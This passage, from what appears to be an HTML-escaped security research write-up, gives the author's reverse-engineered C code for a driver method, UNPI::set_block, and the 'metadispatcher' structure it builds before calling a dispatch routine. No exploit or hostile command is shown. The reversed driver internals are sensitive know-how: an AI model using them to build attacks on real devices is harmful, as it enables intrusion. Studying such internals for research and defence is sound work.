class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint32_t cnt_remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint8_t &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structure_input_buffer&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint64_t structure_input_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;Here's my reversed implementation of &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;UNPI::set_block&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.3aba48cdaac58ae867b60889bc2f2ff94e4953a6\"&gt;&lt;/a&gt;&lt;a id=\"t.12\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;UNPI&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;::&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;set_block&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; UNPI&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;task&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;caller_task_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;first_scalar_input&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;second_scalar_input&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint32_t cnt_remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint8_t &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structure_input_buffer&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint64_t structure_input_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;block_handler_holder &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;holder&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;metadispatcher metadisp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c10\"&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;if&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;second_scalar_input &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;return&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0x80000001LL&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; holder &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;UPPipeDCP_H13P&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;block_handler_holders&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;if&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;!&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;holder &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;return&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0x8000000BLL&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c10\"&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; metadisp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;.&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;address_of_some_zerofill_static_buffer &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;unk_3B8D18&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; metadisp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;.&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;handlers_holder &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;holder&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; metadisp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;.&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structure_input_buffer &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;structure_input_buffer&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; metadisp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;.&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structure_input_size &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;structure_input_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; metadisp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;.&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;remaining_scalar_inputs &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; metadisp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;.&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;cnt_remaining_sclar_input &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;cnt_remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; metadisp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;.&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;some_flags &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0x40000000LL&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; metadisp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;.&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;dispatcher_fptr &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;a_dispatcher&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; metadisp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;.&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;offset_of_something_which_looks_serialization_related &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;off_1C1308&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;return&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;metadispatch&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;holder&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;first_scalar_input&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;1&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;caller_task_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;structure_input_buffer&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;metadisp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;This method wraps up the arguments into another structure I've called &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;metadispatcher&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.70518115c511a294cd855553b9003a0771a08ccd\"&gt;&lt;/a&gt;&lt;a id=\"t.13\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;__attribute__&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;((&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;aligned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;8&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)))&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp;metadispatcher&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;uint64_t address_of_some_zerofill_static_buffer&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;uint64_t some_flags&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;__int64 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;__fastcall &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;dispatcher_fptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;metadispatcher &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;BlockHandler&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;__int64&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;_QWORD&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;uint64_t offset_of_something_which_looks_serialization_related&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;block_handler_holder &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;handlers_holder&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;uint64_t structure_input_buffer&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;uint64_t structure_input_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;uint64_t remaining_scalar_inputs&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;uint32_t cnt_remaining_sclar_input&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;That metadispatcher object is then passed to this method:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.9e3136a3d4346cb21c1c8dc0948c6e7439c8fc5f\"&gt;&lt;/a&gt;&lt;a id=\"t.14\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;return&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;metadispatch&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;holder&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;first_scalar_input&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;1&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;caller_task_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;structure_input_buffer&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;metadisp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;In there we reach this code:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 